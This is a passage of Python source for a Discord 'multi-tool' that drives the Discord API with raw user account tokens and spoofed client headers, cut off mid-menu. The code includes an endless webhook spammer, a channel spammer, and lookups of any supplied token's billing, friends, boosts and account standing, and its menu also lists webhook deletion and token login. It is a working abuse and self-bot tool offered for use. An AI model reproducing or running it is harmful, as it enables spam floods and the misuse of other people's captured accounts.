vers = "v0.0.1"
import os, requests, time, re, json, asyncio, aiohttp, subprocess, ctypes
from datetime import datetime, timedelta
from selenium.common import exceptions
from selenium import webdriver
from os import system
GREEN = '\033[92m'
BLUE = '\033[95m'
RED = '\033[91m'
GRAY = '\033[90m'
ENDC = '\033[0m'
GWL_STYLE = -16
WS_SIZEBOX = 0x00040000
WS_MAXIMIZEBOX = 0x00010000
STD_OUTPUT_HANDLE = -11
HEADERS = {'Authority': 'discord.com', 'Accept': '*/*', 'Accept-Language': 'sv,sv-SE;q=0.9', 'Content-Type': 'application/json', 'Origin': 'https://discord.com', 'Referer': 'https://discord.com/', 'Sec-Ch-Ua': '"Not?A_Brand";v="8", "Chromium";v="108"', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"Windows"', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36', 'X-Debug-Options': 'bugReporterEnabled', 'X-Discord-Locale': 'en-US', 'X-Discord-Timezone': 'Europe/Stockholm', 'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTI3LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjMxMzM0NCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='}
original_size = None
original_window = None
scroll_disabled = False
class COORD(ctypes.Structure):
    _fields_ = [("X", ctypes.c_short), ("Y", ctypes.c_short)]
class SMALL_RECT(ctypes.Structure):
    _fields_ = [("Left", ctypes.c_short), ("Top", ctypes.c_short), ("Right", ctypes.c_short), ("Bottom", ctypes.c_short)]
class CONSOLE_SCREEN_BUFFER_INFO(ctypes.Structure):
    _fields_ = [("dwSize", COORD), ("dwCursorPosition", COORD), ("wAttributes", ctypes.c_ushort), ("srWindow", SMALL_RECT), ("dwMaximumWindowSize", COORD)]
def scroll_disable():
    global original_size, original_window, scroll_disabled
    scroll_disabled = True
    csbi = CONSOLE_SCREEN_BUFFER_INFO()
    handle = ctypes.windll.kernel32.GetStdHandle(STD_OUTPUT_HANDLE)
    ctypes.windll.kernel32.GetConsoleScreenBufferInfo(handle, ctypes.byref(csbi))
    original_size = csbi.dwSize
    original_window = csbi.srWindow
    new_height = original_window.Bottom - original_window.Top + 1
    new_size = COORD(csbi.dwSize.X, new_height)
    ctypes.windll.kernel32.SetConsoleScreenBufferSize(handle, new_size)
    console_window_size = SMALL_RECT(0, 0, csbi.dwSize.X - 1, new_height - 1)
    ctypes.windll.kernel32.SetConsoleWindowInfo(handle, True, ctypes.byref(console_window_size))
def scroll_enable():
    global original_size, original_window, scroll_disabled
    scroll_disabled = False
    handle = ctypes.windll.kernel32.GetStdHandle(STD_OUTPUT_HANDLE)
    csbi = CONSOLE_SCREEN_BUFFER_INFO()
    ctypes.windll.kernel32.GetConsoleScreenBufferInfo(handle, ctypes.byref(csbi))
    scrollbar_width = csbi.dwSize.X - (original_window.Right - original_window.Left + 1)
    ctypes.windll.kernel32.SetConsoleScreenBufferSize(handle, original_size)
    original_window.Right = original_window.Left + original_size.X - 1
    original_window.Bottom = original_window.Top + original_size.Y - 1
    if scrollbar_width > 0:
        original_window.Right -= scrollbar_width
    ctypes.windll.kernel32.SetConsoleWindowInfo(handle, True, ctypes.byref(original_window))
def set_window_properties(hwnd, style):
    ctypes.windll.user32.SetWindowLongW(hwnd, GWL_STYLE, ctypes.windll.user32.GetWindowLongW(hwnd, GWL_STYLE) & ~style)
def gradient_text(text, start_color = "7d7cf9", end_color = "68e3f9"):
    start_color_rgb = tuple(int(start_color[i:i+2], 16) for i in (0, 2, 4))
    end_color_rgb = tuple(int(end_color[i:i+2], 16) for i in (0, 2, 4))
    steps = len(text)
    r_step = (end_color_rgb[0] - start_color_rgb[0]) / steps
    g_step = (end_color_rgb[1] - start_color_rgb[1]) / steps
    b_step = (end_color_rgb[2] - start_color_rgb[2]) / steps
    gradient_text = ""
    for i, char in enumerate(text):
        r = int(start_color_rgb[0] + (r_step * i))
        g = int(start_color_rgb[1] + (g_step * i))
        b = int(start_color_rgb[2] + (b_step * i))
        gradient_text += f"\033[38;2;{r};{g};{b}m{char}"
    return gradient_text + ENDC
def validate_input(prompt, validator, error_message):
    while True:
        user_input = input(prompt).strip()
        if validator(user_input):
            return user_input
        else:
            print(RED + error_message + ENDC)
def parse_date(iso_date):
    try:
        parsed_date = datetime.fromisoformat(iso_date)
        formatted_date = parsed_date.strftime('%d.%m.%Y %H:%M')
        return formatted_date
    except (Exception, ValueError):
        return "Invalid Date"
def send_webhook(url, content):
    data = {'content': content}
    response = requests.post(url, json=data)
    if response.status_code == 204:
        print(GREEN + "[#] Successfully sent to Webhook" + ENDC, ": " + gradient_text(content) + ENDC)
    else:
        print(RED + f"[!] Failed to send to Webhook {ENDC}-{RED} RSC: {response.status_code}" + ENDC)
        print("[#] Retrying in 5 seconds...")
        time.sleep(5)
def delete_webhook(url):
    response = requests.delete(url)
    if response.status_code == 204:
        print(GREEN + "[#] Webhook deleted successfully!" + ENDC)
        input(gradient_text("[#] Press enter to return."))
    else:
        print(RED + f"[!] Failed to delete webhook {ENDC}-{RED} RSC: {response.status_code}" + ENDC)
        input(gradient_text("[#] Press enter to return."))
def validate_webhook(url):
    pattern = re.compile(r'^https://(discord(app)?\.com)/api/webhooks/\d+/[A-Za-z0-9_\-]+$')
    if not pattern.match(url):
        return False
    try:
        response = requests.get(url)
        response.raise_for_status()
        return True
    except (requests.RequestException, ValueError):
        return False
def get_user_info(token):
    headers = {'Authorization': token, **HEADERS}
    response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
    if response.status_code == 200:
        return response.json()
    else:
        print(RED + "[!] Failed to fetch token information." + ENDC)
        return None
def get_num_user_friends(token):
    headers = {'Authorization': token, **HEADERS}
    response = requests.get('https://discord.com/api/v10/users/@me/relationships', headers=headers)
    if response.status_code == 200:
        return len([friend for friend in response.json() if friend['type'] == 1]), len([friend for friend in response.json() if friend['type'] == 2]), len([friend for friend in response.json() if friend['type'] == 3])
    else:
        return "N/A", "N/A", "N/A"
def get_num_user_guilds(token):
    headers = {'Authorization': token, **HEADERS}
    response = requests.get('https://discord.com/api/v10/users/@me/guilds', headers=headers)
    if response.status_code == 200:
        return len(response.json())
    else:
        return 0
def get_num_boosts(token):
    headers = {'Authorization': token, **HEADERS}
    response = requests.get('https://discord.com/api/v9/users/@me/guilds/premium/subscriptions', headers=headers)
    if response.status_code == 200:
        return sum(1 for boost in response.json() if not boost['guild_id']), [{'server_id': boost['guild_id']} for boost in response.json() if boost['guild_id']]
    else:
        return 0, []
def num_nitro_expiry_days(token):
    headers = {'Authorization': token, **HEADERS}
    response = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers)
    if response.status_code == 200:
        nitro_data = response.json()
        if nitro_data:
            end_date = datetime.strptime(nitro_data[0].get("current_period_end").split('.')[0], "%Y-%m-%dT%H:%M:%S")
            time_left = end_date - datetime.now()
            days_left, remainder = divmod(time_left.seconds + time_left.days * 86400, 86400)
            hours_left, _ = divmod(remainder, 3600)
            if days_left > 0:
                return f"{days_left} Day{'s' if days_left != 1 else ''} {hours_left} Hour{'s' if hours_left != 1 else ''}"
            elif hours_left > 0:
                return f"{hours_left} Hour{'s' if hours_left != 1 else ''}"
            else:
                return "Less than an hour"
        return "No Nitro"
    return "N/A"
def get_account_locked(token):
    headers = {'Authorization': token, **HEADERS}
    payload = {'settings': "IikKJwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYA=="}
    response = requests.patch('https://discord.com/api/v9/users/@me/settings-proto/1', json=payload, headers=headers)
    if response.status_code == 403:
        if response.json().get('code') == 40002:
            return True
        else:
            return False
    else:
        return False
def get_account_standing(token):
    headers = {'Authorization': token, **HEADERS}
    response = requests.get('https://discord.com/api/v9/safety-hub/@me', headers=headers)
    if response.status_code == 200:
        return response.json().get('account_standing', {}).get('state')
    else:
        return None
def validate_token(token):
    headers = {'Authorization': token, **HEADERS}
    try:
        response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False
def close_all_dms(token):
    headers = {'Authorization': token, **HEADERS}
    try:
        response = requests.get('https://discord.com/api/v10/users/@me/channels', headers=headers)
        dm_channels = response.json()
        for channel in dm_channels:
            if channel['type'] != 1:
                continue
            response = requests.delete(f"https://discord.com/api/v10/channels/{channel['id']}", headers=headers)
            if response.status_code == 200:
                print(GREEN + "[#] Successfully closed DM" + ENDC + " : " + gradient_text(channel['id']) + ENDC)
            else:
                print(RED + "[!] Failed to close DM" + ENDC + " : " + gradient_text(channel['id']) + RED + f" - RSC: {response.status_code}" + ENDC)
        if not any(channel['type'] == 1 for channel in dm_channels):
            print(RED + "[#] No DMs found to close." + ENDC)
        else:
            print(gradient_text("[#] All DMs closed successfully."))
    except Exception:
        print(RED + "[!] Unknown error occurred." + ENDC)
def leave_all_groupchats(token):
    headers = {'Authorization': token, **HEADERS}
    try:
        response = requests.get('https://discord.com/api/v10/users/@me/channels', headers=headers)
        channels = response.json()
        for channel in channels:
            if channel['type'] == 3:
                response = requests.delete(f"https://discord.com/api/v10/channels/{channel['id']}", headers=headers)
                if response.status_code == 200:
                    print(GREEN + "[#] Successfully left Groupchat" + ENDC + " : " + gradient_text(channel['id']) + ENDC)
                else:
                    print(RED + "[!] Failed to leave Groupchat" + ENDC + " : " + gradient_text(channel['id']) + RED + f" {ENDC}-{RED} RSC: {response.status_code}" + ENDC)
        if not any(channel['type'] == 3 for channel in channels):
            print(RED + "[#] No Groupchats found to leave." + ENDC)
        else:
            print(gradient_text("[#] All Groupchats left successfully."))
    except Exception:
        print(RED + "[!] Unknown error occurred." + ENDC)
def delete_all_messages(token, channel_id):
    headers = {'Authorization': token, **HEADERS}
    user_info = get_user_info(token)
    if not user_info:
        return
    user_id = user_info['id']
    last_message_id = None
    messages_found = False
    messages_deleted = False
    while True:
        params = {'limit': 100}
        if last_message_id:
            params['before'] = last_message_id
        for attempt in range(3):
            try:
                print(GRAY + f"[#] Fetching Messages in Channel.. - {params}" + ENDC)
                response = requests.get(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, params=params)
                response.raise_for_status()
                break
            except requests.exceptions.HTTPError:
                print(RED + "[!] Failed to retrieve messages due to HTTP error" + ENDC)
            except requests.exceptions.ConnectionError:
                print(RED + "[!] Failed to retrieve messages due to Connection error" + ENDC)
            except Exception:
                print(RED + "[!] Failed to retrieve messages due to Unknown error" + ENDC)
            if attempt < 2:
                print("[#] Retrying in 10 seconds...")
                time.sleep(10)
            else:
                print(RED + "[!] Exceeded retry attempts, aborting." + ENDC)
                return
        if response.status_code == 200:
            messages = response.json()
            if not messages:
                break
            for message in messages:
                last_message_id = message['id']
                if 'call' in message:
                    continue
                if (message['author']['id'] == user_id) or (message['author'].get('bot', False) and (message.get('interaction_metadata', {}).get('user', {}).get('id') == user_id or message.get('interaction', {}).get('user', {}).get('id') == user_id)):
                    messages_found = True
                    while True:
                        delete_response = requests.delete(f"https://discord.com/api/v9/channels/{channel_id}/messages/{message['id']}", headers=headers)
                        if delete_response.status_code == 204:
                            messages_deleted = True
                            print(GREEN + "[#] Successfully deleted message" + ENDC + " : " + gradient_text(message['id']) + ENDC)
                            break
                        elif delete_response.status_code == 429:
                            print(RED + "[!] Failed to delete message" + ENDC + " : " + gradient_text(message['id']) + RED + f" {ENDC}-{RED} RSC: {delete_response.status_code}" + ENDC)
                            print(f"[#] Retrying in 5 seconds...")
                            time.sleep(5)
                        else:
                            print(RED + "[!] Failed to delete message" + ENDC + " : " + gradient_text(message['id']) + RED + f" {ENDC}-{RED} RSC: {delete_response.status_code}" + ENDC)
                            break
        else:
            print(RED + f"[!] Failed to retrieve messages {ENDC}-{RED} RSC: {response.status_code}" + ENDC)
            break
    if messages_found and messages_deleted:
        print(GREEN + "[#] All messages from Token have been deleted." + ENDC)
    elif not messages_found:
        print(RED + "[#] No messages found from Token in Channel." + ENDC)
    elif messages_found and not messages_deleted:
        print(RED + "[!] Messages from Token in Channel were found but none were deleted?" + ENDC)
def react_to_messages(token, type):
    headers = {'Authorization': token, **HEADERS}
    user_info = get_user_info(user_token)
    if not user_info:
        return
    channel_linkorid = validate_input(gradient_text("[#] Channel: "), lambda x: re.search(r'/channels/(\d+)/', x) or x.isdigit(), "[#] Invalid Input. Please enter a valid channel link or id.")
    channel_id_match = re.search(r'/channels/(\d+)/', channel_linkorid)
    channel_id = channel_id_match.group(1) if channel_id_match else channel_linkorid
    emoji = validate_input(gradient_text("[#] Emoji String (eg., <:en:eid>): "), lambda e: re.match(r'<a?:(.*?):(\d+)>', e), "[#] Invalid Emoji String. Please check the format and try again.")
    emoji_match = re.match(r'<(a?):(.*?):(\d+)>', emoji)
    if emoji_match: emoji_name = emoji_match.group(2); emoji_id = emoji_match.group(3); emoji = f"{emoji_name}:{emoji_id}"
    encoded_emoji = emoji.replace(':', '%3A')
    use_super_reaction = validate_input(gradient_text("[#] Use Super Reactions?\n[#] (y/n): ") + ENDC, lambda v: v.lower() in ["y", "n"], "[#] Invalid Input. Please enter either 'y' or 'n']") if 'premium_type' in user_info and user_info['premium_type'] > 0 else "n"
    last_message_id = None
    while True:
        response = requests.get(f"https://discord.com/api/v9/channels/{channel_id}/messages?limit=3", headers=headers)
        if response.status_code != 200:
            print(RED + f"[!] Failed to retrieve messages {ENDC}-{RED} RSC: {response.status_code}" + ENDC)
            break
        messages = response.json()
        for message in messages:
            if 'content' in message:
                message_id = message['id']
                if type == '1' or (type == '2' and message['author']['id'] == user_info['id']):
                    if last_message_id is None or message_id > last_message_id:
                        response = requests.put(f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{encoded_emoji}/@me{'?type=1' if use_super_reaction.lower() == 'y' else ''}", headers=headers)
                        if response.status_code == 204:
                            print(GREEN + "[#] Reacted to message" + ENDC, ": " + gradient_text(message_id) + ENDC)
                        else:
                            print(RED + f"[!] Failed to react to message {message_id} {ENDC}-{RED} RSC: {response.status_code}" + ENDC)
                        last_message_id = message_id
def get_invite_info(invite_url):
    match = re.search(r"(?:https?://)?(?:www\.)?(discord\.gg|discord\.com/invite|discordapp\.com/invite)/(?:invite/)?([a-zA-Z0-9]+)", invite_url)
    invite_code = match.group(2) if match else invite_url
    response = requests.get(f"https://discord.com/api/v10/invites/{invite_code}?with_counts=true")
    if response.status_code == 200:
        data = response.json()
        print(GRAY + f"[#] Invite Code: {data.get('code')}" + ENDC)
        expires_at = data.get('expires_at')
        if expires_at:
            expiration_time = datetime.fromisoformat(expires_at[:-6]) + timedelta(hours=2)
            current_time = datetime.now()
            time_left = expiration_time - current_time
            days_left = time_left.days
            hours_left = time_left.seconds // 3600
            if days_left > 0:
                print(GRAY + f"[#] Expires in: {days_left} Day{'s' if days_left != 1 else ''} {hours_left} Hour{'s' if hours_left != 1 else ''}" + ENDC)
            elif hours_left > 0:
                print(GRAY + f"[#] Expires in: {hours_left} Hour{'s' if hours_left != 1 else ''}" + ENDC)
            else:
                print(GRAY + "[#] Expires in: Less than an hour" + ENDC)
        else:
            print(GRAY + "[#] Expires in: Never" + ENDC)
        inviter = data.get('inviter', {})
        if inviter:
            print(GRAY + f"[#] Inviter: {inviter.get('username', 'N/A')}" + ENDC)
            print(GRAY + f"[#] Inviter ID: {inviter.get('id', 'N/A')}" + ENDC)
        guild = data.get('guild', {})
        print(GRAY + f"[#] Name: {guild.get('name', 'N/A')}" + ENDC)
        print(GRAY + f"[#] ID: {guild.get('id', 'N/A')}" + ENDC)
        print(GRAY + f"[#] Description: {guild.get('description', 'N/A')}" + ENDC)
        print(GRAY + f"[#] Verification Level: {guild.get('verification_level', 'N/A')}" + ENDC)
        print(GRAY + f"[#] Vanity: {guild.get('vanity_url_code', 'N/A')}" + ENDC)
        print(GRAY + f"[#] Boosts: {guild.get('premium_subscription_count', 'N/A')}" + ENDC)
        channel = data.get('channel', {})
        print(GRAY + f"[#] Channel: {channel.get('name', 'N/A')}" + ENDC)
        print(GRAY + f"[#] Channel ID: {channel.get('id', 'N/A')}" + ENDC)
        print(GRAY + f"[#] Member Count: {data.get('approximate_member_count', 'N/A')}" + ENDC)
        print(GRAY + f"[#] Online Count: {data.get('approximate_presence_count', 'N/A')}" + ENDC)
    else:
        print(RED + f"[!] Failed to retrieve information {ENDC}-{RED} RSC: {response.status_code}" + ENDC)
def get_serverid_info(token, id):
    headers = {'Authorization': token, **HEADERS}
    response = requests.get(f"https://discord.com/api/v10/guilds/{id}?with_counts=true", headers=headers)
    if response.status_code == 200:
        data = response.json()
        channels = requests.get(f"https://discord.com/api/v10/guilds/{id}/channels", headers=headers)
        owner_info = requests.get(f"https://discord.com/api/v10/users/{data.get('owner_id', 'N/A')}", headers=headers)
        print(GRAY + f"[#] Name: {data.get('name', 'N/A')}" + ENDC)
        print(GRAY + f"[#] ID: {data.get('id', 'N/A')}" + ENDC)
        if owner_info.status_code == 200:
            owner_data = owner_info.json()
            print(GRAY + f"[#] Owner: {owner_data.get('username', 'N/A')}" + ENDC)
        else:
            print(GRAY + "[#] Owner: N/A" + ENDC)
        print(GRAY + f"[#] Owner ID: {data.get('owner_id', 'N/A')}" + ENDC)
        print(GRAY + f"[#] Description: {data.get('description', 'N/A')}" + ENDC)
        print(GRAY + f"[#] Verification Level: {data.get('verification_level', 'N/A')}" + ENDC)
        print(GRAY + f"[#] Vanity: {data.get('vanity_url_code', 'N/A')}" + ENDC)
        print(GRAY + f"[#] Boosts: {data.get('premium_subscription_count', 'N/A')}" + ENDC)
        print(GRAY + f"[#] Boost Level: {data.get('premium_tier', 'N/A')}" + ENDC)
        print(GRAY + f"[#] Member Count: {data.get('approximate_member_count', 'N/A')}" + ENDC)
        print(GRAY + f"[#] Online Count: {data.get('approximate_presence_count', 'N/A')}" + ENDC)
        print(GRAY + f"[#] Channel Count: {len(channels.json()) if channels.status_code == 200 else 'N/A'}" + ENDC)
        print(GRAY + f"[#] Emoji Count: {len(data.get('emojis', []))}" + ENDC)
        print(GRAY + f"[#] Sticker Count: {len(data.get('stickers', []))}" + ENDC)
        print(GRAY + f"[#] Role Count: {len(data.get('roles', []))}" + ENDC)
    else:
        print(RED + f"[!] Failed to retrieve information {ENDC}-{RED} RSC: {response.status_code}" + ENDC)
def validate_ip(ip):
    pattern = r"^(?!0\.0\.0\.0$)(?!255\.255\.255\.255$)(?:(?:25[0-4]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-4]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
    return bool(re.match(pattern, ip))
def ip_lookup(ip):
    try:
        response = requests.get(f'https://ipinfo.io/{ip}/json')
        response.raise_for_status()
        return response.json()
    except (requests.exceptions.RequestException, ValueError):
        return None
def ping_ip(ip, count):
    try:
        command = ["ping", ip]
        if count > 0:
            command.extend(["-n" if os.name == 'nt' else "-c", str(count)])
        elif count == 0:
            command.append("-t")
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        while True:
            output = process.stdout.readline()
            if output:
                print(GRAY + f"[#] {output.decode().strip()}" + ENDC)
            elif count > 0 and process.poll() is not None:
                break
            elif count == 0 and process.poll() is not None:
                break
            elif count == 0 and process.poll() is None:
                continue
        rc = process.poll()
        return rc == 0
    except Exception:
        print(RED + f"[!] An error occured." + ENDC)
        return False
def get_guild_emojis(token, server_id):
    headers = {'Authorization': token, **HEADERS}
    response = requests.get(f"https://discord.com/api/v9/guilds/{server_id}/emojis", headers=headers)
    if response.status_code == 200:
        return response.json()
    elif response.status_code == 404:
        return 404
    else:
        return None
async def download_emoji(session, emoji, inner_emoji_dir):
    emoji_path = os.path.join(inner_emoji_dir, f"{emoji['name']}.{'gif' if emoji['animated'] else 'png'}")
    try:
        async with session.get(f"https://cdn.discordapp.com/emojis/{emoji['id']}.{'gif' if emoji['animated'] else 'png'}") as response:
            if response.status == 200:
                print(GREEN + f"[#] Successfully downloaded Emoji" + ENDC + " : " + gradient_text(emoji['name']))
                with open(emoji_path, 'wb') as f:
                    f.write(await response.read())
                return True
            else:
                print(RED + f"[!] Failed to download Emoji" + ENDC + " : " +  gradient_text(emoji['name']) + RED + f"- RSC: {response.status_code}" + ENDC)
                return False
    except Exception:
        print(RED + f"[!] Unknown error while downloading Emoji" + ENDC + " : " +  gradient_text(emoji['name']) + RED + f"- RSC: {response.status_code}" + ENDC)
        return False
async def download_emoji_async(emojis, inner_emoji_dir):
    print(gradient_text(f"[#] Downloading {len(emojis)} Emojis.."))
    async with aiohttp.ClientSession() as session:
        tasks = [download_emoji(session, emoji, inner_emoji_dir) for emoji in emojis]
        results = await asyncio.gather(*tasks)
        successful_downloads = sum(results)
        return successful_downloads
def get_guild_stickers(token, server_id):
    headers = {'Authorization': token, **HEADERS}
    response = requests.get(f"https://discord.com/api/v9/guilds/{server_id}/stickers", headers=headers)
    if response.status_code == 200:
        return response.json()
    elif response.status_code == 404:
        return 404
    else:
        return None
def get_format_type(format_type):
    format_map = {1: 'webp', 2: 'png', 3: 'lottie', 4: 'gif'}
    return format_map.get(format_type, 'webp')
async def download_sticker(session, sticker, inner_sticker_dir):
    valid_filename = re.sub(r'[\\/*?:"<>|]', '', sticker['name'])
    sticker_path = os.path.join(inner_sticker_dir, f"{valid_filename}.webp")
    try:
        async with session.get(f"https://media.discordapp.net/stickers/{sticker['id']}.{get_format_type(sticker['format_type'])}?size=160") as response:
            if response.status == 200:
                with open(sticker_path, 'wb') as f:
                    f.write(await response.read())
                print(GREEN + f"[#] Successfully downloaded Sticker" + ENDC + " : " + gradient_text(sticker['name']))
                return True
            else:
                print(RED + f"[!] Failed to download Sticker" + ENDC + " : " + gradient_text(sticker['name']) + RED + f" {ENDC}-{RED} RSC: {response.status_code}" + ENDC)
                return False
    except Exception:
        print(RED + f"[!] Error downloading Sticker" + ENDC + " : " + gradient_text(sticker['name']) + RED + f" {ENDC}-{RED} RSC: {response.status_code}" + ENDC)
        return False
async def download_stickers_async(stickers, inner_sticker_dir):
    print(gradient_text(f"[#] Downloading {len(stickers)} Stickers.."))
    async with aiohttp.ClientSession() as session:
        tasks = [download_sticker(session, sticker, inner_sticker_dir) for sticker in stickers]
        results = await asyncio.gather(*tasks)
        successful_downloads = sum(results)
        return successful_downloads
system("title " + "RepoTool   -   Made by Fire")
set_window_properties(ctypes.windll.kernel32.GetConsoleWindow(), WS_SIZEBOX | WS_MAXIMIZEBOX)
while True:
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        if not scroll_disabled: scroll_disable()
        mode = input(gradient_text(rf"""
                                               
                                _______________________________________________________
                               │                ____                      Made by Fire │
                               │               / __ \___  ____  ____                   │
                               │              / /_/ / _ \/ __ \/ __ \                  │
                               │             / _, _/  __/ /_/ / /_/ /                  │
                               │            /_/ |_|\___/ .___/\____/                   │
                               │                      /_/                              │
                               │ {vers}        Ctrl+C to go back to menu               │
                               ├───────────────────────────┬───────────────────────────┤
                               │ [1] Webhook Spammer       │ [11] IP Address Lookup    │
                               │ [2] Webhook Information   │ [12] IP Address Pinger    │
                               │ [3] Webhook Deleter       │ [13] Hypesquad Changer    │
                               │ [4] Channel Spammer       │ [14] Server Lookup        │
                               │ [5] Channel Monitoring    │ [15] Get Your Token       │
                               │ [6] DM Channel Clearer    │ [16] Token Information    │
                               │ [7] Group Chat Clearer    │ [17] Token Payments       │
                               │ [8] Message Deleter       │ [18] Token Login          │
                               │ [9] Message Reacter       │ [19] Delete Emojis        │
                               │ [10] Animated Status      │ [20] Delete Stickers      │
                               ├───────────────────────────┴───────────────────────────┘
                               │
                               └> """))
        try:
            if int(mode) < -1 or int(mode) > 20:
                continue
        except ValueError:
            pass
        if mode == '0':
            os.system('cls' if os.name == 'nt' else 'clear')
            if scroll_disabled: scroll_enable()
            print(gradient_text("[#] Getting Latest Version.."))
            try:
                response = requests.get("https://api.github.com/repos/vqpe/Discord-MultiTool/releases/latest")
                if response.status_code == 200:
                    latest_version = response.json().get('tag_name')
                    if latest_version:
                        print(GRAY + f"[#] Current Version: {vers}" + ENDC)
                        print(GRAY + f"[#] Latest Version: {latest_version}" + ENDC)
                        try:
                            current_ver = re.match(r'^[\d\.]+', vers.lstrip('v')).group(0)
                            latest_ver = re.match(r'^[\d\.]+', latest_version.lstrip('v')).group(0)
                            comparison_result = (current_ver < latest_ver) or (current_ver == latest_ver and re.sub(r'^[\d\.]+', '', vers).strip('-') < re.sub(r'^[\d\.]+', '', latest_version).strip('-'))
                        except Exception:
                            comparison_result = False
                        if comparison_result:
                            print(RED + f"[#] Not on Latest Version!\n[>] Latest download (EXE): https://github.com/Schuh1337/Discord-MultiTool/releases/download/{latest_version}/schuh.exe\n[>] Latest download (SRC): https://github.com/Schuh1337/Discord-MultiTool/archive/refs/heads/main.zip" + ENDC)
                        else:
                            print(GREEN + "[#] On Latest Version!" + ENDC)
                    else:
                        print(RED + "[!] Unknown error occurred." + ENDC)
                else:
                    print(RED + f"[!] Failed to fetch latest version {ENDC}-{RED} RSC: {response.status_code}" + ENDC)
            except Exception:
                print(RED + f"[!] Failed to get latest Version." + ENDC)
            input(gradient_text("[#] Press enter to return."))
            continue
        elif mode == '1':
            os.system('cls' if os.name == 'nt' else 'clear')
            if scroll_disabled: scroll_enable()
            message_content = validate_input(gradient_text("[#] Message you want to spam: ") + ENDC, lambda content: len(content) >= 1, "[#] Message too short. Please enter a message with at least 1 character.")
            webhook_url = validate_input(gradient_text("[#] Webhook URL: ") + ENDC, validate_webhook, "[#] Invalid webhook URL. Please check the URL and try again.")
            delay = validate_input(gradient_text("[#] Delay (in seconds): ") + ENDC, lambda value: (value.replace('.', '', 1).isdigit() if '.' in value else value.isdigit()) and float(value) > 0, "[#] Invalid Delay. Please enter a positive number.")
            delay = float(delay)
            while True:
                send_webhook(webhook_url, message_content)
                time.sleep(delay)
        elif mode == '2':
            os.system('cls' if os.name == 'nt' else 'clear')
            if scroll_disabled: scroll_enable()
            webhook_url = validate_input(gradient_text("[#] Webhook URL: "), validate_webhook, "[#] Invalid webhook URL. Please check the URL and try again.")
            try:
                response = requests.get(webhook_url)
                if response.status_code == 200:
                    webhook_info = response.json()
                    print(GRAY + f"[#] Name: {webhook_info.get('name', 'N/A')}" + ENDC)
                    print(GRAY + f"[#] Guild ID: {webhook_info.get('guild_id', 'N/A')}" + ENDC)
                    print(GRAY + f"[#] Channel ID: {webhook_info.get('channel_id', 'N/A')}" + ENDC)
                    if 'avatar' in webhook_info and webhook_info['avatar'] is not None:
                        avatar_url = f"https://cdn.discordapp.com/avatars/{webhook_info['id']}/{webhook_info['avatar']}.png"
                        print(GRAY + f"[#] Avatar: {avatar_url}" + ENDC)
                    else:
                        print(GRAY + "[#] Avatar: N/A" + ENDC)
                else:
                    print(RED + f"[!] Failed to fetch webhook information {ENDC}-{RED} RSC: {response.status_code}" + ENDC)
                input(gradient_text("[#] Press enter to return."))
            except json.JSONDecodeError:
                pass
        elif mode == '3':
            os.system('cls' if os.name == 'nt' else 'clear')
            if scroll_disabled: scroll_enable()
            webhook_url = validate_input(gradient_text("[#] Webhook URL: "), validate_webhook, "[#] Invalid webhook URL. Please check the URL and try again.")
            confirmation = validate_input(gradient_text("[#] Are you sure you want to delete the webhook?\n[#] (y/n): "), lambda v: v.lower() in ["y", "n"], "[#] Invalid Input. Please enter either 'y' or 'n'")
            if confirmation.lower() == 'y':
                delete_webhook(webhook_url)
            else:
                print(RED + "[#] Webhook deletion cancelled." + ENDC)
                input(gradient_text("[#] Press enter to return."))
        elif mode == '4':
            os.system('cls' if os.name == 'nt' else 'clear')
            if scroll_disabled: scroll_enable()
            message_content = validate_input(gradient_text("[#] Message you want to spam: "), lambda content: len(content) >= 1, "[#] Message too short. Please enter a message with at least 1 character.")
            user_token = validate_input(gradient_text("[#] Token: "), validate_token, "[#] Invalid Token. Please check the token and try again.")
            channel_linkorid = validate_input(gradient_text("[#] Channel: "), lambda x: re.search(r'/channels/(\d+)/', x) or x.isdigit(), "[#] Invalid Input. Please enter a valid channel link or id.")
            channel_id_match = re.search(r'/channels/(\d+)/', channel_linkorid)
            channel_id = channel_id_match.group(1) if channel_id_match else channel_linkorid
            num_messages = validate_input(gradient_text("[#] Number of times to send the message (0 = infinite): "), lambda value: value.isdigit() and int(value) >= 0, "[#] Invalid Input. Please enter a non-negative integer.")
            num_messages = int(num_messages)
            delay = validate_input(gradient_text("[#] Delay (in seconds): "),  lambda value: (value.replace('.', '', 1).isdigit() if '.' in value else value.isdigit()) and float(value) > 0, "[#] Invalid Delay. Please enter a positive number.")
            delay = float(delay)
            payload = {'content': message_content}
